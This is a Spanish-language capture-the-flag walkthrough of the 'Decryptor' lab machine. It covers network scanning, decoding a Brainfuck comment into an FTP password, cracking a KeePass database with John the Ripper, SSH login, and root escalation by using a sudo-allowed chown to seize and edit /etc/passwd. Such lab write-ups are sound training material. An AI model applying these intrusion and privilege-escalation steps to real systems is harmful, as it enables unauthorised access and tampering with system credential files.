# Decryptor

Maquinas a utilizar Kali Linux y Decryptor [https://thehackerslabs.com/decryptor/](https://thehackerslabs.com/decryptor/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%20162.png)

```bash
nmap -p- -sS -sV -sC --open -min-rate=1000 -n -vvv -Pn 10.0.3.36
```

![image.png](./imagenes/image%20163.png)

- Miramos lo que corre por el puerto 80
    
    ![image.png](./imagenes/image%20164.png)
    
    `CTRL+Z`
    
    ![image.png](./imagenes/image%20165.png)
    
    Vemos el siguiente código Brainfuck.
    
    ```
    <!--++++++++++[>+++++++++++>++++++++++>+++++++++++>+++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++++>+++++++++++>++++++++++>++++++++++++>++++++++++++>++++++++++>++++++++++<<<<<<<<<<<<<<<-]>-.>---.>++++.>-----.>+.>+.>---.>----.>-----.>--.>+.>----..>---.>-.>+. -->
    
    ```
    
    Pero para decodificarlo debemos descartara `<!--` al principio y  `-->` al final. Quedando así:
    
    ```
    <!--++++++++++[>+++++++++++>++++++++++>+++++++++++>+++++++++++>+++++++++++>++++++++++>++++++++++>++++++++++++>++++++++++++>+++++++++++>++++++++++>++++++++++++>++++++++++++>++++++++++>++++++++++<<<<<<<<<<<<<<<-]>-.>---.>++++.>-----.>+.>+.>---.>----.>-----.>--.>+.>----..>---.>-.>+. -->
    
    ```
    

- Utilizamos para la decodificación la pagina [https://www.dcode.fr/](./imagenes/https://www.dcode.fr/).
    
    ![image.png](./imagenes/image%20166.png)
    
    **marioeatslettuce**
    

- Aquí debemos emplear la deducción y el usuario: **mario** y la password: **marioeatslettuce** y lo probamos con el FTP**.**
    
    ```bash
    ftp 10.0.3.36 -p 2121
    ```
    
    ![image.png](./imagenes/image%20167.png)
    

- Nos encontramos con el archivo **user.kdbx**  en esta misma carpeta ****y lo descargamos a nuestra maquina Kali**.**
    
    `ls -la`
    
    `get user.kdbx`
    
    ![image.png](./imagenes/image%20168.png)
    

- Vamos a intentar cracker el archivo con **John the Rippers.**
    
    ```bash
    keepass2john user.kdbx > hash
    ```
    
    ![image.png](./imagenes/image%20169.png)
    
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash 
    ```
    
    ![image.png](./imagenes/image%20170.png)
    
    Ya tenemos la contraseña: **moonshine1**
    

- Como no tengo keepass instalado lo instalo.
    
    ```bash
    sudo apt install keepass2
    ```
    

- Abro el archivo con el programa Keepass
    
    ![image.png](./imagenes/image%20171.png)
    
    ![image.png](./imagenes/image%20172.png)
    
    **Usuario: chiquero Password: barcelona2012**
    

- Entramos por SSH con las credenciales obtenidas.
    
    ```bash
    ssh [chiquero@10.0.3.36](./imagenes/mailto:chiquero@10.0.3.36)
    ```
    
    ![image.png](./imagenes/image%20173.png)
    
- Listamos vulnerabilidades con **sudo -l**
    
    `sudo -l`
    
    ![image.png](./imagenes/image%20174.png)
    
- Usamos la web [https://gtfobins.github.io/](./imagenes/https://gtfobins.github.io/)
    
    ![image.png](./imagenes/image%20175.png)
    

- Cambiamos el propietario y el grupo del archivo `/etc/passwd` a los del usuario que lo ejecuta. Y lo modificamos para poder ser root.
    
    ```bash
    LFILE=/etc/passwd
    ```
    
    ```bash
    sudo chown $(id -un):$(id -gn) $LFILE
    ```
    
    ```bash
    nano /etc/passwd
    ```
    
    ![image.png](./imagenes/image%20176.png)
    
    ![image.png](./imagenes/image%20177.png)
    
    Le quitamos la `X`
    
    ![image.png](./imagenes/image%20178.png)
    
- Nos convertimos en **root**
    
    `su root`
    
    `whoami`
    
    ![image.png](./imagenes/image%20179.png)
   